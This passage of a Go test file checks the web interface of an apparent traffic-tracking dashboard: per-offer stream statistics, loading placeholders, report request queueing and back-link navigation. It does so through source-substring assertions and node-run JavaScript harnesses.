	html := spaSource()
	render := spaFunctionLine(html, "renderFlow")
	if render == "" {
		t.Fatal("renderFlow missing")
	}
	statsAt := strings.Index(render, "${destStats}")
	marksAt := strings.Index(render, "${isLink?'':flowDestMarks(o, flowDestNamed(")
	if statsAt < 0 || marksAt < 0 || statsAt > marksAt {
		t.Fatal("offer names must follow the numbers")
	}
	must(t, render, "flowDestTypeLabel(o)", "the action type names an offer or a landing")
	must(t, render, ":flowDestURL(o)}", "a direct URL stays on the row")
	mustNot(t, render, "flowDestMarks(o)}${nv", "offer names are not beside the action type")
	must(t, html, ".canvas.compact .dest .hint.num{display:block", "a compact destination shows the stream total")
	must(t, html, ".canvas.compact .dest .olines{display:none}", "the collapsed card hides per-offer rows")
	must(t, html, ".dest:has(.olines)>.hint.num{display:none}", "the detailed row does not put the stream total above the offer lines")
	mustNot(t, html, ".canvas.compact .dest:has(.olines)>.hint.num{display:none}", "the collapsed total stays visible")
	must(t, html, ".dest .badges .pill,.dest .oline .pill{display:inline-flex;align-items:center;gap:4px;width:14em", "the offer chip has a fixed width")
	must(t, render, "if(!FLOW_COMPACT) queueOpenStreamOffers(g)", "the collapsed canvas does not ask for the offer breakdown")
	must(t, render, "if(FLOW_COMPACT) stopStreamOfferQueue()", "collapsing the canvas does not start a report")
	must(t, render, "renderFlow(); drawWires();", "collapsing redraws the badge row")
	must(t, render, "queueOpenStreamOffers(CUR)", "opening the detailed canvas asks for the stream that was opened")
	statsFn := spaFunctionLine(html, "flowDestStatsHTML")
	must(t, statsFn, "flowOfferLine", "an offer row uses the folded counts")
	must(t, statsFn, "if(!folded)", "a report that is not stored yet is not drawn as zeros")
	must(t, statsFn, "skel-bar", "before the report the offer metrics are a short loading bar")
	must(t, statsFn, "table.loading", "the loading bar is named with the translated word")
	must(t, statsFn, "streamHint(st,false)", "an offer line uses the stream hint")
	mustNot(t, statsFn, "if(!folded) return one", "the first paint does not wait for the report to lay out the line")
	mustNot(t, statsFn, "sp.profit", "offer numbers are not taken from the stream total")
	mustNot(t, statsFn, "it.pct*", "a share is not used to split the stream total")
	qsFn := spaFunctionLine(html, "flowStreamReportQS")
	must(t, qsFn, "campaign_id", "the breakdown is filtered to the campaign")
	must(t, qsFn, "stream", "the breakdown is filtered to the stream")
	mustNot(t, qsFn, "limit", "one stream is not a page of the report table")
	must(t, spaFunctionLine(html, "loadFlowStreamOffers"), "get('/api/report?'", "the breakdown is the report of that stream")
	must(t, spaFunctionLine(html, "loadFlowStreamOffers"), "if(FLOW_COMPACT", "a compact canvas does not ask")
	must(t, spaFunctionLine(html, "scheduleStreamOfferPaint"), "FLOW_COMPACT", "a collapsed card is not redrawn by the offer report")
	must(t, spaFunctionLine(html, "pumpStreamOffers"), "FLOW_COMPACT", "the queue stops on the collapsed card")
	must(t, spaFunctionLine(html, "queueOpenStreamOffers"), "if(FLOW_COMPACT", "the collapsed card does not queue its streams")
	must(t, spaFunctionLine(html, "queueStreamOffers"), "STREAM_OFFER_Q.unshift", "a stream on screen or just expanded goes ahead of the queue")
	must(t, spaFunctionLine(html, "queueOpenStreamOffers"), "streamsOnScreen", "streams off screen are not all asked up front")
	must(t, render, "watchStreamOfferScreen()", "scrolling a stream into view asks for it")
	for _, line := range []string{
		`'dest.offer':'offer'`, `'dest.landing':'landing'`,
		`'dest.offer':'оффер'`, `'dest.landing':'лендинг'`,
		`'dest.offer':'офер'`, `'dest.landing':'лендінг'`,
	} {
		if n := strings.Count(html, line); n != 1 {
			t.Errorf("%s: %d dictionary entries, want 1", line, n)
		}
	}
	var src strings.Builder
	src.WriteString("const esc=(s)=>String(s==null?'':s);\n")
	src.WriteString("const tr=k=>({'dest.offer':'offer','dest.landing':'landing','HTTP redirect':'HTTP redirect'}[k]||k);\n")
	src.WriteString("const typeLabel=t=>tr(t==='http_redirect'?'HTTP redirect':(t||'—'));\n")
	src.WriteString("function streamHint(sp){const conv=+sp.conv||0;const bit=conv>0?'<span class=\"c-rev\">'+conv+'</span>':String(conv||0);const profit=+sp.profit||0;const rev=profit>0?'<span class=\"c-rev\">'+profit+'</span>':String(profit);return (sp.bots||0)+' bots · '+bit+' · '+rev}\n")
	src.WriteString("const zero=()=>({hits:0,unique:0,bots:0,conv:0,profit:0,cost:{}});\n")
	src.WriteString("function add(o,r){o.hits+=r.hits||0;o.unique+=r.unique||0;o.bots+=r.bots||0;o.conv+=r.conv||0;o.profit+=+r.profit||0;return o}\n")
	src.WriteString("let PERF=[]; let OFFERS=[]; let LANDINGS=[];\n")
	src.WriteString("let FLOW_COMPACT=false; let RANGE={id:'today',from:'',to:''};\n")
	src.WriteString("let STREAM_OFFERS=new Map(); let STREAM_OFFERS_WAIT=new Map(); let STREAM_OFFER_Q=[]; let STREAM_OFFER_RUN=0; let STREAM_OFFER_PAINT=0; let STREAM_OFFER_PERIOD='';\n")
	src.WriteString("let REPORT_GETS=[]; let REPORT_BODY=[]; function reportTotals(){return {hits:0,bots:0,conv:0,profit:0,cost:{}}}\n")
	src.WriteString("function rangeQS(){return 'from=A&to=B'}\n")
	src.WriteString("const get=(path)=>{ REPORT_GETS.push(String(path)); return Promise.resolve(REPORT_BODY); };\n")
	src.WriteString("let paints=0; function renderFlow(){ paints++; }\n")
	src.WriteString("let CUR=null; const route=()=>({page:'dashboard',arg:''}); const q=()=>null;\n")
	mark := strings.Index(html, "const FLOW_DEST_BADGES=")
	if mark < 0 {
		t.Fatal("FLOW_DEST_BADGES is missing")
	}
	line := html[mark:]
	nl := strings.Index(line, "\n")
	src.WriteString(line[:nl+1])
	for _, name := range []string{"thenURL", "thenLive", "thenMode", "nameOf", "flowSharePcts", "flowDestLabel", "flowOfferStopped", "flowDestItems", "flowDestTip", "flowDestOfferBadge", "flowOfferMark", "flowDestMarks", "flowDestKinds", "flowDestTypeLabel", "condEscapeFilterValue", "condsQS", "reportData", "streamOfferPeriod", "streamOfferKey", "streamOffersFresh", "foldStreamOffers", "flowOfferLine", "flowStreamOfferMap", "flowStreamReportQS", "flowDestWantsReport", "flowCanvasOpen", "stopStreamOfferQueue", "scheduleStreamOfferPaint", "loadFlowStreamOffers", "pumpStreamOffers", "queueStreamOffers", "streamsOnScreen", "watchStreamOfferScreen", "queueOpenStreamOffers", "streamOffersReady", "flowDestStatsHTML", "flowDestNamed"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		src.WriteString(fn + "\n")
	}
	src.WriteString(`
let failed = 0;
const eq = (got, want, what) => { if (got !== want) { failed++; console.log('FAIL ' + what + '\n  got  ' + got + '\n  want ' + want); } };
const g = {id:'g1', name:'Camp'};
const offers = {redirect:'http_redirect', offers:[{id:'o1', share:60},{id:'o2', share:40}]};
const sp = {hits:10, bots:3, conv:10, profit:100};
OFFERS = [{id:'o1', name:'Alpha', status:true},{id:'o2', name:'Beta', status:true}];
LANDINGS = [{id:'l1', name:'Land'}];
const row = (expanded) => flowDestStatsHTML(offers, sp, g, 'main', expanded, false) + flowDestMarks(offers, flowDestNamed(offers, g, 'main', expanded, false, sp));

eq(flowDestTypeLabel(offers), 'HTTP redirect (offer)', 'an offer destination names the offer');
eq(flowDestTypeLabel({redirect:'http_redirect', landings:[{id:'l1', share:100}]}), 'HTTP redirect (landing)', 'a landing destination names the landing');
eq(flowDestTypeLabel({redirect:'landing', landings:[{id:'l1', share:100}]}), 'landing', 'the landing type is not named twice');
eq(flowDestTypeLabel({redirect:'http_redirect', offers:[{id:'o1', share:50}], landings:[{id:'l1', share:100}]}), 'HTTP redirect (offer, landing)', 'both sides are named');
eq(flowDestTypeLabel({redirect:'http_redirect', out:'https://1wyvdy.life/casino/list?open=register'}), 'HTTP redirect', 'a direct URL stays the plain type');
eq(flowDestTypeLabel({redirect:'http_redirect', out:'https://click.example/click?offer_id=6004'}).includes('offer'), false, 'an offer id in the query is not a label');

const linesOf = (html) => {
  const a = html.indexOf('<div class="olines">');
  if (a < 0) return '';
  const b = html.indexOf('class="badges"', a);
  return b > a ? html.slice(a, b) : html.slice(a);
};
const put = (stream, rows) => { STREAM_OFFERS.set(streamOfferKey(g, stream), foldStreamOffers(rows)); };

let h = row(false);
eq(h.includes('olines'), false, 'the collapsed card has no offer row');
eq(h.includes('3 bots'), true, 'the collapsed line is the stream total');
eq(h.indexOf('3 bots') < h.indexOf('class="badges"'), true, 'the stream total sits above the badges');
const compactBadges = h.slice(h.indexOf('class="badges"'));
eq(compactBadges.includes('>Alpha<') && compactBadges.indexOf('>Alpha<') < compactBadges.indexOf('>Beta<'), true, 'offers with a share sit in one badge row');
eq(compactBadges.includes('bots'), false, 'the badge row has no per-offer numbers');

h = row(true);
let lines = linesOf(h);
eq(lines.includes('skel-bar'), true, 'before the answer the row shows that the numbers are loading');
eq(lines.includes('table.loading'), true, 'the loading bar carries the translated name');
eq(lines.includes('0 bots'), false, 'before the answer an offer row does not draw zeros');
eq(lines.includes('0 conv'), false, 'before the answer there is no 0 conv');
eq(/0\s*конв/.test(lines), false, 'before the answer there is no 0 конв.');
eq(lines.includes('>Alpha<') && lines.indexOf('>Alpha<') < lines.indexOf('skel-bar'), true, 'before the answer the first badge is left of the loading bar');
eq(lines.includes('>Beta<') && lines.indexOf('>Beta<') < lines.indexOf('skel-bar', lines.indexOf('>Beta<')), true, 'before the answer the second offer is already a row');
eq(lines.includes('3 bots'), false, 'before the answer the stream total is not copied onto the offers');
eq(h.includes('class="badges"'), false, 'both offers stay on rows, not under the summary');

const savedEarly = OFFERS;
OFFERS = [{id:'o1', name:'Alpha', status:true},{id:'o2', name:'Beta', status:true},{id:'o3', name:'Gamma', status:true},{id:'o4', name:'Delta', status:true},{id:'o5', name:'Epsilon', status:true}];
const earlyOut = {redirect:'http_redirect', offers:[{id:'o1', share:100},{id:'o2', share:0},{id:'o3', share:0},{id:'o4', share:0},{id:'o5', share:0}]};
h = flowDestStatsHTML(earlyOut, sp, g, 'early', true, false) + flowDestMarks(earlyOut, flowDestNamed(earlyOut, g, 'early', true, false, sp));
eq(h.includes('class="oline"'), true, 'before the report one offer is already one row');
const early = h.slice(h.indexOf('class="oline"'), h.indexOf('class="badges"'));
eq(early.includes('skel-bar'), true, 'before the answer that row shows a loading bar');
eq(early.includes('0 bots'), false, 'before the answer that row does not draw zeros');
eq(/0\s*конв/.test(early), false, 'before the answer that row has no 0 конв.');
eq(early.indexOf('>Alpha<') < early.indexOf('skel-bar'), true, 'before the answer the badge sits left of the loading bar');
eq(early.includes('>100%<'), true, 'the share stays on the badge');
eq(early.includes('(0%)'), false, 'zero shares are not on the numbers row');
const earlyBadges = h.slice(h.indexOf('class="badges"'));
eq(earlyBadges.includes('>+4 (0%)<'), true, 'zero shares stay under the line before the report');
eq(earlyBadges.includes('Alpha'), false, 'the offer on the line is not badged again');
eq((h.match(/class="hint num"/g) || []).length, 2, 'the stream summary stays in the markup and on the line');
h = flowDestStatsHTML(earlyOut, sp, g, 'early', false, false) + flowDestMarks(earlyOut, flowDestNamed(earlyOut, g, 'early', false, false, sp));
eq(h.includes('olines'), false, 'the collapsed card is not a row per offer');
eq(h.includes('3 bots'), true, 'the collapsed line is the stream total');
eq(h.indexOf('3 bots') < h.indexOf('class="badges"'), true, 'the total sits above the badges');
const collapsedBadges = h.slice(h.indexOf('class="badges"'));
eq(collapsedBadges.includes('>Alpha<') && collapsedBadges.includes('>+4 (0%)<'), true, 'the offer and the zero shares share the badge row');
eq(collapsedBadges.indexOf('>Alpha<') < collapsedBadges.indexOf('>+4 (0%)<'), true, 'zero shares sit in the badge row, not on their own line');
eq(collapsedBadges.includes('bots'), false, 'the collapsed badges have no conversions of their own');
const quiet = flowDestStatsHTML(offers, {hits:0,bots:0,conv:0,profit:0}, g, 'quiet', false, false) + flowDestMarks(offers, flowDestNamed(offers, g, 'quiet', false, false));
eq(quiet.includes('0 bots'), true, 'before the total the collapsed line is zeros');
eq(quiet.includes('olines'), false, 'badges are already a row before the total');
eq(quiet.indexOf('0 bots') < quiet.indexOf('>Alpha<'), true, 'the zero total stays above the badges');
OFFERS = savedEarly;

put('main', [
  {offer:'o1', country:'US', source:'a', bots:1, conv:2, profit:10},
  {offer:'o1', country:'DE', source:'b', bots:1, conv:2, profit:5},
  {offer:'', country:'US', source:'a', bots:9, conv:9, profit:9},
  {offer:'o2', country:'US', source:'a', bots:4, conv:0, profit:0}
]);
h = row(true);
lines = linesOf(h);
eq(lines.includes('class="olines"'), true, 'the detailed row has a line for every offer that receives traffic');
eq((lines.match(/class="hint num"/g) || []).length, 2, 'an offer with only bots stays on its own row');
eq(lines.includes('2 bots'), true, 'country rows of one offer are summed');
eq(lines.includes('skel-bar'), false, 'a report already stored does not show the loading bar');
eq(lines.includes('0 bots'), false, 'an expand with the report already stored does not draw zeros');
eq(lines.includes('4 bots'), true, 'bots alone stay on the offer row');
eq(lines.includes('3 bots'), false, 'the stream total is not copied onto an offer');
eq(lines.includes('9 bots'), false, 'a row with no offer is not a line');
eq(lines.includes('class="pill"'), true, 'the offer name is the gray badge');
eq(lines.includes('title="Alpha — 60%"'), true, 'the line title is the full name');
eq(lines.includes('>Alpha<') && lines.indexOf('>Alpha<') < lines.indexOf('2 bots'), true, 'the offer name sits left of its numbers');
eq(lines.includes('>60%<') && lines.indexOf('>60%<') < lines.indexOf('2 bots'), true, 'the share sits with the name');
eq(lines.includes('>Beta<') && lines.indexOf('>Beta<') < lines.indexOf('4 bots'), true, 'the second offer stays left of its numbers');
eq(lines.includes('c-rev">4'), true, 'a positive conversion is green');
eq(lines.includes('c-rev">15'), true, 'a positive revenue is green');
eq(h.includes('class="badges"'), false, 'offers that receive traffic are not badged under the row');
h = row(false);
eq(h.includes('olines'), false, 'after the report the collapsed card is still one total');
eq(h.includes('3 bots'), true, 'the collapsed total stays the stream, not an offer');
eq(h.includes('2 bots'), false, 'an offer count is not written on the collapsed card');
eq(h.includes('4 bots'), false, 'the second offer is not given its own line');
const afterBadges = h.slice(h.indexOf('class="badges"'));
eq(afterBadges.includes('>Alpha<') && afterBadges.includes('>Beta<'), true, 'the badges stay in one row after the report');
eq(afterBadges.includes('bots'), false, 'the report does not move numbers onto the badges');

STREAM_OFFERS = new Map();
put('main', [
  {offer:'o1', country:'US', source:'a', bots:1, conv:4, profit:10},
  {offer:'o2', country:'US', source:'a', bots:1, conv:4, profit:10}
]);
h = row(true);
eq(h.includes('class="badges"'), false, 'no badge row when every offer has revenue');
eq((linesOf(h).match(/class="hint num"/g) || []).length, 2, 'both offers with revenue are lines');

const soloOut = {redirect:'http_redirect', offers:[{id:'o1', share:100}]};
STREAM_OFFERS = new Map();
STREAM_OFFERS.set(streamOfferKey(g, 'solo'), foldStreamOffers([]));
h = flowDestStatsHTML(soloOut, sp, g, 'solo', true, false) + flowDestMarks(soloOut, flowDestNamed(soloOut, g, 'solo', true, false, sp));
eq(h.includes('class="pill"'), true, 'one offer on the row is a badge');
const soloLine = h.slice(h.indexOf('class="oline"'));
eq(soloLine.indexOf('>Alpha<') < soloLine.indexOf('0 bots'), true, 'that badge sits left of zeros');
eq(soloLine.includes('3 bots'), false, 'an empty fold does not copy the stream total');
eq((h.match(/class="badges"/g) || []).length, 0, 'the same offer is not repeated under the numbers');
h = flowDestStatsHTML(soloOut, sp, g, 'solo', false, false) + flowDestMarks(soloOut, flowDestNamed(soloOut, g, 'solo', false, false, sp));
eq(h.includes('olines'), false, 'the collapsed card does not open an offer row');
eq(h.includes('3 bots'), true, 'one offer still shows the stream total');
eq(h.slice(h.indexOf('class="badges"')).includes('>Alpha<'), true, 'that offer is a badge under the total');

STREAM_OFFERS = new Map();
const savedOffers = OFFERS;
OFFERS = [{id:'o1', name:'Alpha', status:true},{id:'o2', name:'Beta', status:true},{id:'o3', name:'Gamma', status:true},{id:'o4', name:'Delta', status:true}];
const many = {redirect:'http_redirect', offers:[{id:'o1', share:10},{id:'o2', share:30},{id:'o3', share:30},{id:'o4', share:30}]};
STREAM_OFFERS = new Map();
STREAM_OFFERS.set(streamOfferKey(g, 'wide'), foldStreamOffers([{offer:'o1', bots:0, conv:3, profit:9}]));
const wide = flowDestMarks(many, flowDestNamed(many, g, 'wide', true, false));
eq(wide, '', 'every offer that receives traffic is on a line, not under it');
OFFERS = savedOffers;

STREAM_OFFERS = new Map();
put('other', [
  {offer:'o1', bots:1, conv:4, profit:10},
  {offer:'o2', bots:1, conv:4, profit:10}
]);
h = flowDestStatsHTML(offers, sp, g, 'main', true, false);
lines = linesOf(h);
eq(lines.includes('1 bots'), false, 'numbers of another stream are not used');
eq(lines.includes('skel-bar'), true, 'without this fold the row shows a loading bar');
eq(lines.includes('0 bots'), false, 'without this fold the row does not draw zeros');
eq(/0\s*конв/.test(lines), false, 'without this fold there is no 0 конв.');
eq(lines.includes('>Alpha<') && lines.indexOf('>Alpha<') < lines.indexOf('skel-bar'), true, 'without this fold the badge stays left of the loading bar');

const direct = {redirect:'http_redirect', out:'https://1wyvdy.life/casino/list?open=register'};
h = flowDestStatsHTML(direct, sp, g, 'main', true, false) + flowDestMarks(direct);
eq(h.includes('olines'), false, 'a direct link has no offer lines');
eq(h.includes('class="badges"'), false, 'a direct link has no offer names');
eq(flowDestTypeLabel(direct) !== flowDestTypeLabel(offers), true, 'the direct link label differs from the offer label');

(async () => {
  STREAM_OFFERS = new Map();
  STREAM_OFFERS_WAIT = new Map();
  STREAM_OFFER_Q = [];
  STREAM_OFFER_RUN = 0;
  STREAM_OFFER_PERIOD = '';
  REPORT_GETS = [];
  FLOW_COMPACT = true;
  eq(loadFlowStreamOffers(g, 'main'), null, 'a compact canvas does not ask');
  eq(REPORT_GETS.length, 0, 'a compact canvas sends no report');
  queueOpenStreamOffers({id:'g1', streams:[{name:'main', out:offers}]});
  eq(REPORT_GETS.length, 0, 'a collapsed canvas does not queue a report per stream');
  h = row(false);
  eq(h.includes('olines'), false, 'the collapsed card stays one total and a badge row');
  eq(h.slice(h.indexOf('class="badges"')).includes('>Alpha<'), true, 'the badges do not wait for the report');

  FLOW_COMPACT = false;
  REPORT_BODY = [
    {offer:'o1', country:'US', source:'a', bots:1, conv:2, profit:3},
    {offer:'o1', country:'DE', source:'b', bots:1, conv:1, profit:4}
  ];
  const asked = loadFlowStreamOffers(g, 'main');
  eq(asked != null, true, 'opening one stream asks for its breakdown');
  h = flowDestStatsHTML(offers, sp, g, 'main', true, false);
  lines = linesOf(h);
  eq(lines.includes('skel-bar'), true, 'while the answer is still out the row shows a loading bar');
  eq(lines.includes('0 bots'), false, 'while the answer is still out there is no zero line');
  eq(lines.includes('0 conv'), false, 'while the answer is still out there is no 0 conv');
  eq(/0\s*конв/.test(lines), false, 'while the answer is still out there is no 0 конв.');
  await asked;
  eq(REPORT_GETS.length, 1, 'one stream asks once');
  const q = decodeURIComponent(REPORT_GETS[0]);
  eq(q.indexOf('/api/report?') === 0, true, 'the request is the report');
  eq(q.includes('campaign_id:eq:g1'), true, 'the report is this campaign');
  eq(q.includes('stream:eq:main'), true, 'the report is this stream');
  eq(q.includes('meta=1'), true, 'the report is the whole slice of the stream');
  eq(REPORT_GETS[0].includes('limit='), false, 'the stream slice is not paged');
  await loadFlowStreamOffers(g, 'main');
  eq(REPORT_GETS.length, 1, 'a stream already folded is not asked again');
  h = flowDestStatsHTML(offers, sp, g, 'main', true, false);
  lines = linesOf(h);
  eq((lines.match(/class="hint num"/g) || []).length, 2, 'both offers stay on a row after the report');
  eq(lines.includes('skel-bar'), false, 'after the answer the loading bar is gone');
  eq(lines.includes('2 bots'), true, 'the offer line is the folded report');
  eq(lines.includes('>Alpha<') && lines.indexOf('>Alpha<') < lines.indexOf('2 bots'), true, 'the offer name sits left of its numbers');
  eq(lines.includes('>Beta<') && lines.indexOf('>Beta<') < lines.indexOf('0 bots', lines.indexOf('>Beta<')), true, 'an offer missing from the report stays on a row of zeros');

  STREAM_OFFER_RUN = 2;
  STREAM_OFFER_Q = [];
  STREAM_OFFERS_WAIT = new Map();
  queueStreamOffers(g, 'off-a');
  queueStreamOffers(g, 'off-b');
  queueStreamOffers(g, 'off-c');
  queueOpenStreamOffers(g, ['zarbet']);
  eq(STREAM_OFFER_Q.map(x => x.stream).join(','), 'zarbet', 'expanding puts this stream ahead of the collapsed queue');
  eq(REPORT_GETS.length, 1, 'a full pair of reports does not take the expanded stream as a third');
  const stored = REPORT_GETS.length;
  STREAM_OFFERS.set(streamOfferKey(g, 'zarbet'), foldStreamOffers([]));
  queueStreamOffers(g, 'zarbet', true);
  eq(REPORT_GETS.length, stored, 'opening a stream already stored does not ask again');

  STREAM_OFFER_RUN = 0;
  STREAM_OFFER_Q = [];
  STREAM_OFFERS = new Map();
  STREAM_OFFERS_WAIT = new Map();
  REPORT_GETS = [];
  queueOpenStreamOffers(g, ['top', 'mid', 'bottom']);
  eq(REPORT_GETS.length, 2, 'only two reports run at once');
  eq(decodeURIComponent(REPORT_GETS[0]).includes('stream:eq:top'), true, 'the first stream on screen starts first');
  eq(decodeURIComponent(REPORT_GETS[1]).includes('stream:eq:mid'), true, 'the next stream on screen is the other running report');
  eq(STREAM_OFFER_Q.map(x => x.stream).join(','), 'bottom', 'the rest of the screen waits behind those two');
  if (failed) process.exit(1);
})().catch((e) => { console.log(e); process.exit(1); });
`)
	f := filepath.Join(t.TempDir(), "flowdeststats.js")
	if err := os.WriteFile(f, []byte(src.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("stream destination stats failed:\n%s", out)
	}
}

// TestFlowBackToList checks the "Campaigns" back link of an open campaign. Both back links carry
// data-flows-back and the document click handler marks only a plain click on them; the list then
// reuses the campaigns in memory once, while the menu item (no mark) and an unloaded list still read
// them. Leaving the campaign drops the queued per-stream reports. Under node the mark and the take
// are run against GROUPS loaded and not loaded. t is the test handle; node absent skips the run.
func TestFlowBackToList(t *testing.T) {
	html := spaSource()
	if n := strings.Count(html, `href="#/flows" style="height:32px" data-flows-back>`); n != 2 {
		t.Errorf("%d back links carry data-flows-back, want 2 (the page and its placeholder)", n)
	}
	must(t, html, "e.target.closest('a[data-flows-back]')) flowsBackMark()", "a click on the back link marks the list")
	must(t, html, "e.button===0&&!(e.ctrlKey||e.metaKey||e.shiftKey||e.altKey)", "only a plain click is marked")
	flows := spaFunctionLine(html, "flows")
	must(t, flows, "const keep=flowsTakeKeep();", "the list asks once whether to keep the campaigns")
	must(t, flows, "ensureGroups(!keep)", "a kept list is not read again")
	mustNot(t, flows, "ensureGroups(true),loadPerf(),loadMoney(),ensureDomains(),get('/api/traffic-sources',[])]);\n  FLOW_SOURCES", "the list read has no unconditional refresh")
	must(t, html, "ensureGroups(true),loadPerf(true)", "the refresh button still reads the campaigns")
	render := spaFunctionLine(html, "render")
	must(t, render, "if(page!=='flows'||!arg) stopStreamOfferQueue();", "leaving a campaign drops the queued reports")
	must(t, render, "if(page!=='flows') FLOWS_KEEP=false;", "another page forgets the mark")
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the back link run")
	}
	var src strings.Builder
	src.WriteString("let GROUPS=null;\n")
	src.WriteString(spaBetween(html, "let FLOWS_KEEP=false;", "\n") + "\n")
	for _, name := range []string{"flowsBackMark", "flowsTakeKeep"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		src.WriteString(fn + "\n")
	}
	src.WriteString(`
let failed = 0;
const eq = (got, want, what) => { if (got !== want) { failed++; console.log('FAIL ' + what + '\n  got  ' + got + '\n  want ' + want); } };
eq(flowsTakeKeep(), false, 'the menu item sets no mark');
flowsBackMark();
eq(flowsTakeKeep(), false, 'nothing loaded: the list reads the campaigns once as usual');
GROUPS = [{id: 'a'}];
eq(flowsTakeKeep(), false, 'loaded campaigns without a click are read again');
flowsBackMark();
eq(flowsTakeKeep(), true, 'the back link keeps the loaded campaigns');
eq(flowsTakeKeep(), false, 'the mark is used once');
flowsBackMark();
GROUPS = null;
eq(flowsTakeKeep(), false, 'campaigns dropped after the click are read again');
if (failed) process.exit(1);
`)
	f := filepath.Join(t.TempDir(), "flowback.js")
	if err := os.WriteFile(f, []byte(src.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("flow back link failed:\n%s", out)
	}
}

// TestFlowBackStaysOnList checks that a late answer cannot put the campaign back on screen after the user
// went from #/flows/{id} to #/flows (the back link and the menu item share this path). The redraw that
// waits for a per-stream report runs only while the campaign canvas is the page on screen, leaving the
// campaign cancels a redraw that is already waiting, and the address is never written by it. Under node the
// timers are run by hand against an open campaign and against the list. t is the test handle; node absent
// skips the run.
func TestFlowBackStaysOnList(t *testing.T) {
	html := spaSource()
	paint := spaFunctionLine(html, "scheduleStreamOfferPaint")
	must(t, paint, "!flowCanvasOpen()", "the redraw checks that the campaign is still the page")
	must(t, spaFunctionLine(html, "stopStreamOfferQueue"), "STREAM_OFFER_PAINT++", "leaving cancels a redraw that waits")
	must(t, spaFunctionLine(html, "render"), "if(page!=='flows'||!arg) stopStreamOfferQueue();", "the list drops the reports of the campaign")
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the back to list run")
	}
	var src strings.Builder
	src.WriteString("let FLOW_COMPACT=false; let STREAM_OFFER_Q=[]; let STREAM_OFFER_PAINT=0; let CUR=null;\n")
	src.WriteString("const location={hash:'#/flows/g1'}; let canvas=true; let paints=0; let timers=[];\n")
	src.WriteString("const q=sel=>sel==='#canvas'&&canvas?{}:null;\n")
	src.WriteString("const setTimeout=fn=>{timers.push(fn)};\n")
	src.WriteString("function renderFlow(){ paints++; }\n")
	src.WriteString("function route(){const h=location.hash.replace(/^#\\/?/,''), i=h.indexOf('/');return {page:i<0?h:h.slice(0,i), arg:i<0?'':h.slice(i+1)}}\n")
	for _, name := range []string{"flowCanvasOpen", "stopStreamOfferQueue", "scheduleStreamOfferPaint"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		src.WriteString(fn + "\n")
	}
	src.WriteString(`
let failed = 0;
const eq = (got, want, what) => { if (got !== want) { failed++; console.log('FAIL ' + what + '\n  got  ' + got + '\n  want ' + want); } };
const fire = () => { const run = timers; timers = []; run.forEach(f => f()); };
CUR = {id: 'g1'};

scheduleStreamOfferPaint();
fire();
eq(paints, 1, 'an answer on the open campaign redraws it');

scheduleStreamOfferPaint();
const queued = timers.length;
scheduleStreamOfferPaint();
eq(timers.length, queued, 'a later answer does not drop the redraw that is already waiting');
fire();
eq(paints, 2, 'the waiting redraw still runs and fills the rows');

scheduleStreamOfferPaint();
location.hash = '#/flows'; canvas = false;
fire();
eq(paints, 2, 'an answer after the move to the list does not draw the campaign');
eq(location.hash, '#/flows', 'the address stays on the list');

location.hash = '#/flows/g1'; canvas = true;
scheduleStreamOfferPaint();
stopStreamOfferQueue();
fire();
eq(paints, 2, 'leaving the campaign cancels the waiting redraw');

scheduleStreamOfferPaint();
location.hash = '#/flows/g2';
fire();
eq(paints, 2, 'another campaign address does not draw this one');

location.hash = '#/flows'; canvas = true;
scheduleStreamOfferPaint();
fire();
eq(paints, 2, 'a stale canvas under the list address is not drawn');
if (failed) process.exit(1);
`)
	f := filepath.Join(t.TempDir(), "flowbacklist.js")
	if err := os.WriteFile(f, []byte(src.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("flow back to list failed:\n%s", out)
	}
}

// TestFlowOfferLineFits checks that an offer line cannot leave its destination card: the chip shrinks
// to a floor and cuts the name with an ellipsis while the percent stays, the numbers keep their width
// and are cut only when the whole card is narrower than the numbers, the destination column is wide enough for both, and the trunk line of
// the canvas keeps 12px from the block edge and from the stream node at every width. t is the test handle.
func TestFlowOfferLineFits(t *testing.T) {
	html := spaSource()
	must(t, html, ".dest .olines .oline{display:flex;align-items:center;gap:8px;min-width:0;max-width:100%;line-height:1.25}", "the line stays on one row inside the card")
	must(t, html, ".dest .olines .oline .pill{flex:0 1 14em;width:auto;min-width:5.5em}", "the chip shrinks instead of pushing the numbers out")
	must(t, html, ".dest .badges .pill .nm,.dest .oline .pill .nm{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;min-width:0}", "the offer name is cut with an ellipsis")
	must(t, html, ".dest .badges .pill .pct,.dest .oline .pill .pct{flex:none}", "the percent is not cut")
	must(t, html, ".dest .olines .hint{flex:none;min-width:0;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;line-height:1.25}", "the numbers keep their width, the chip gives way first, and a last resort cut stays inside the card")
	must(t, html, "grid-template-columns:64px minmax(280px,1fr) 120px minmax(300px,.85fr)", "the destination column holds the chip floor and the numbers")
	must(t, html, ".frow{grid-template-columns:56px minmax(240px,1fr) 84px minmax(280px,.8fr)}", "the medium grid keeps the trunk gap and the card width")
	must(t, html, ".frow{grid-template-columns:54px minmax(0,1fr);row-gap:8px}", "the narrow grid keeps the trunk gap")
	must(t, html, ".entry{margin-left:12px}", "the entry does not touch the canvas edge on a narrow screen")
	must(t, html, ".entry{grid-column:1/3;justify-self:start;margin-left:14px;display:inline-flex;align-items:center;gap:10px;height:40px;padding:0 14px;", "a wide screen keeps the visitor chip")
	phone := spaBetween(html, "@media (max-width:760px){", "th .link{font:inherit;")
	must(t, phone, ".canvas .entry{height:32px;padding:0 8px;gap:6px;font-size:10px}", "the visitor chip is 4px smaller on a phone")
	must(t, phone, ".canvas .entry .ell{overflow:visible;text-overflow:clip", "the campaign id is not cut on a phone")
}

// TestKeywordStatsLogic runs csvTable, the keyword cell, the sparkline and the totals of the keyword
